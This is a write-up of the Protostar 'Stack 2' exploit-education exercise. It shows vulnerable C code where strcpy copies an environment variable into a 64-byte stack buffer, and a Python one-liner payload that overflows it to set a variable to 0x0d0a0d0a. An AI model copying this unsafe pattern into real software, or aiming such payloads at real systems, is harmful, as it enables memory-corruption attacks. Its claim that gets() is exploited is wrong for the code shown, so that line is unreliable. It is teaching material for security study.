# PROTOSTAR : STACK 2
[Protostar:Stack2](https://exploit.education/protostar/stack-two/)

### SOURCE CODE
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];
  char *variable;

  variable = getenv("GREENIE");

  if(variable == NULL) {
      errx(1, "please set the GREENIE environment variable\n");
  }

  modified = 0;

  strcpy(buffer, variable);

  if(modified == 0x0d0a0d0a) {
      printf("you have correctly modified the variable\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }

}
```
### **CODE ANALYSIS**
#### Vulnerability
- Stack Buffer Overflow

The challenge involves Stack Buffer Overflow challenge and we are going to exploit the **gets()** function. We also need to add an environment variable **GREENIE**. We are going to be adding the output of our exploit script to the environment variable.

### **SOLUTION**

Executed the program but it requires but it requires the **GREENIE** enivronment variable.
```
user@protostar:/opt/protostar/bin$ ./stack2
stack2: please set the GREENIE environment variable

user@protostar:/opt/protostar/bin$ 
```

Setting the environment variable and adding our exploit code output, then executing the program.
Keep in mind to pass the string **0x0d0a0d0a** in **LITTLE ENDIAN**.
```
user@protostar:/opt/protostar/bin$ export GREENIE=$(python -c "print 'A'*64 + '\x0a\x0d\x0a\x0d'")
user@protostar:/opt/protostar/bin$ ./stack2
you have correctly modified the variable
user@protostar:/opt/protostar/bin$ 
```
